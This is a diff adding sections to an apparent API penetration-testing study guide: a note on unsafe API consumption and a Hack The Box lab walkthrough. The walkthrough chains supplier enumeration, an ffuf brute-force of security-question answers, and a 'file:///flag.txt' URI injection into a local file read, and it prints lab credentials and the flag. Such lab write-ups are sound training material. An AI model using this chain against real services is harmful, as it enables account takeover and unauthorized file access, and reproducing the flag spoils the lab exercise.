@@ -19,6 +19,8 @@ This document outlines common techniques for identifying and exploiting **API re
   - [Server Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
   - [Security Misconfigurations](#security-misconfigurations)
   - [Improper Inventory Management](#improper-inventory-management)
+  - [Unsafe Consumption of APIs](#unsafe-consumption-of-apis)
+  - [Exploitation - Example](#exploitation---example)
 
 ---
 
@@ -1455,3 +1457,315 @@ This behavior demonstrates **Improper Inventory Management**, where an obsolete 
 Proper API version deprecation, access control enforcement, and data sanitization are essential to prevent this class of vulnerability.
 
 ---
+
+## Unsafe Consumption of APIs
+
+Modern APIs frequently interact with **external or third-party APIs** to exchange data and extend functionality. While this interconnectivity improves scalability and efficiency, it also introduces **significant security risks** when external data is implicitly trusted.
+
+When developers **blindly trust responses from upstream APIs** without enforcing proper validation, sanitization, or verification, downstream systems may process malicious or manipulated data. This often results in relaxed security controls and can lead to injection flaws, logic manipulation, or unauthorized actions being performed on behalf of trusted systems.
+
+An API that consumes another API insecurely is vulnerable to [CWE-1357: Reliance on Insufficiently Trustworthy Component](https://cwe.mitre.org/data/definitions/1357.html)
+
+A brief description of the weakness is shown below:
+
+```
+The product is built from multiple separate components, but it uses a component that is not
+sufficiently trusted to meet expectations for security, reliability, updateability, and maintainability.
+```
+
+---
+
+## Exploitation - Example
+
+After reporting all vulnerabilities present in versions `v0` and `v1` of the **Inlanefreight E-Commerce Marketplace**, the administrator attempted to remediate them in `v2`.
+
+However, new functionality was introduced in `v2` by junior developers, raising concerns that additional vulnerabilities may have been unintentionally introduced. The goal is to assess the security posture of the new API version and apply the techniques covered throughout the module to compromise it.
+The objective is to retrieve the contents of `/flag.txt`.
+
+### Authentication and Initial Access
+
+Authentication is performed via the following endpoint:
+
+```
+/api/v2/authentication/customers/sign-in
+```
+
+Using the credentials below:
+
+```
+{
+  "Email": "htbpentester@hackthebox.com",
+  "Password": "HTBPentester"
+}
+```
+
+The server responds with a valid JWT:
+
+```json
+{
+  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlckBoYWNrdGhlYm94LmNvbSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6WyJTdXBwbGllcnNfR2V0IiwiU3VwcGxpZXJzX0dldEFsbCJdLCJleHAiOjE3NjgxNTk0MzMsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.MBbcuNaQIMjCnjN_NZryJuY4UDjypLa3hzuBYuomhW_uSXipb3n4E6IlXEPH1w-rpVjy5G4W0oddCtG9X-WPtA"
+}
+```
+
+After authorizing with the JWT, querying the endpoint below reveals the roles assigned to the authenticated user:
+
+```
+/api/v2/roles/current-user
+```
+
+- `Suppliers_Get`
+- `Suppliers_GetAll` 
+
+Only two API endpoints are associated with these roles:
+
+- `/api/v2/suppliers`
+- `/api/v2/suppliers/{ID}`
+
+### Supplier Enumeration
+
+Invoking `/api/v2/suppliers` returns a list of all suppliers:
+
+```json
+{
+  "suppliers": [
+    {
+      "id": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
+      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+      "name": "James Allen",
+      "email": "J.Allen1607@globalsolutions.com",
+      "securityQuestion": "SupplierDidNotProvideYet",
+      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
+    },
+    {
+      "id": "575d53eb-30f7-41f0-8c82-6fe9405c1c32",
+      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+      "name": "Tyson Butler",
+      "email": "T.Butler1205@globalsolutions.com",
+      "securityQuestion": "SupplierDidNotProvideYet",
+      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
+    }
+    .
+    .
+    .
+}
+```
+The `/api/v2/suppliers/{ID}` endpoint allows querying individual suppliers by ID:
+
+```bash
+curl -X 'GET' \
+  'http://94.237.120.119:31440/api/v2/suppliers/00ac3d74-6c7d-4ef0-bf15-00851bf353ba' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer <JWT>'
+```
+
+The response contains detailed supplier information, including the field:
+
+```
+professionalCVPDFFileURI
+```
+
+![Filtered output](images/exploitation2.PNG)
+
+One of the JSON parameters is called:
+
+```
+professionalCVPDFFileURI
+```
+
+Given that the objective is to retrieve `/flag.txt`, this field suggests a potential **SSRF** or **Local File Inclusion (LFI)** attack vector, which aligns with previously discussed vulnerabilities in the **Server-Side Request Forgery (SSRF)** section.
+
+### CV Upload Functionality
+
+An endpoint exists for uploading supplier CVs:
+
+```
+/api/v2/suppliers/current-user/cv (POST)
+```
+
+An initial attempt to upload a large PDF file fails:
+
+```bash
+dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
+```
+
+Response:
+
+```json
+{
+  "errorMessage": "Could not upload the CV, its either malicious or very big in size"
+}
+```
+
+Even a small file (5 KB) is rejected, indicating that the issue is not file size. This suggests that **only supplier-authenticated users** are allowed to upload CVs.
+
+Despite being authenticated as a customer, the user is able to access supplier-related endpoints and data. This represents a **Broken Function Level Authorization (BFLA)** vulnerability, as customers should not be able to enumerate supplier information.
+
+### Identifying Password Reset Candidates
+
+Some suppliers have configured security questions. Filtering the supplier list reveals several using the same question:
+
+```
+What is your favorite color?
+```
+
+Suppliers with this security question are extracted, along with their email addresses:
+
+```
+P.Howard1536@globalsolutions.com
+L.Walker1872@globalsolutions.com
+T.Harris1814@globalsolutions.com
+B.Rogers1535@globalsolutions.com
+M.Alexander1650@globalsolutions.com
+```
+
+![Filtered output](images/exploitation6.PNG)
+
+### Brute-Forcing Security Question Answers
+
+Under the `Authentication` section, the following password reset functionality is identified:
+
+```
+/api/v2/authentication/suppliers/passwords/resets/security-question-answers
+```
+
+![Filtered output](images/exploitation7.PNG)
+
+A wordlist containing common colors is used to brute-force the security question answers. The request template is fuzzed using `ffuf`:
+
+
+```bash
+ffuf -w emails.txt:FUZZ1 -w colors.txt:FUZZ2 -request req.txt -request-proto http -fr "false"
+```
+
+A valid combination is discovered:
+
+```
+[Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 13ms]
+    * FUZZ1: B.Rogers1535@globalsolutions.com
+    * FUZZ2: rust
+```
+
+![Filtered output](images/exploitation8.PNG)
+
+Using the recovered credentials, authentication as the supplier is successful:
+
+```
+/api/v2/authentication/suppliers/sign-in
+```
+
+```json
+{
+  "Email": "B.Rogers1535@globalsolutions.com",
+  "Password": "Password123"
+}
+```
+
+A valid supplier JWT is issued. With supplier privileges, the CV upload endpoint now functions correctly:
+
+```bash
+curl -X 'POST' \
+  'http://83.136.249.164:44877/api/v2/suppliers/current-user/cv' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer <JWT>' \
+  -H 'Content-Type: multipart/form-data' \
+  -F 'SupplierCVPDFFormFile=@cv.pdf;type=application/pdf'
+```
+
+Response:
+
+```json
+{
+  "successStatus": true,
+  "fileURI": "file:///app/wwwroot/SupplierCVs/cv.pdf",
+  "fileSize": 1185090
+}
+```
+
+Querying the supplier profile confirms that the local file path is stored in the `professionalCVPDFFileURI` field.
+
+```json
+{
+  "supplier": {
+    "id": "36f17195-395f-443e-93a4-8ceee81c6106",
+    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+    "name": "Brandon Rogers",
+    "email": "B.Rogers1535@globalsolutions.com",
+    "securityQuestion": "What is your favorite color?",
+    "professionalCVPDFFileURI": "file:///app/wwwroot/SupplierCVs/cv.pdf"
+  }
+}
+```
+
+![Filtered output](images/exploitation9.PNG)
+
+### Exploiting Unsafe API Consumption (SSRF / LFI)
+
+The supplier profile update endpoint allows modification of the CV file URI:
+
+```
+/api/v2/suppliers/current-user (PATCH)
+```
+
+```json
+{
+  "SecurityQuestion": "string",
+  "SecurityQuestionAnswer": "string",
+  "ProfessionalCVPDFFileURI": "string",
+  "PhoneNumber": "string",
+  "Password": "string"
+}
+```
+
+![Filtered output](images/exploitation10.PNG)
+
+Because the API fails to validate the URI scheme or enforce path restrictions, the field can be manipulated to reference an arbitrary local file:
+
+```json
+{
+  "SecurityQuestion": "What is your favorite color?",
+  "SecurityQuestionAnswer": "rust",
+  "ProfessionalCVPDFFileURI": "file:///flag.txt",
+  "PhoneNumber": "string",
+  "Password": "Password123"
+}
+```
+
+![Filtered output](images/exploitation11.PNG)
+
+The request is accepted successfully.
+
+```json
+{
+  "SuccessStatus": true
+}
+```
+
+Finally, invoking the CV retrieval endpoint:
+
+```bash
+curl -X 'GET' \
+  'http://83.136.249.164:44877/api/v2/suppliers/current-user/cv' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer <JWT>'
+```
+
+Returns base64-encoded file contents:
+
+```json
+{
+  "successStatus": true,
+  "base64Data": "SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo="
+}
+```
+
+Decoding the data reveals the flag:
+
+```bash
+echo "SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo=" | base64 -d
+```
+
+Flag:
+
+```
+HTB{f190b80cd543a84b236e92a07a9d8d59}
+```
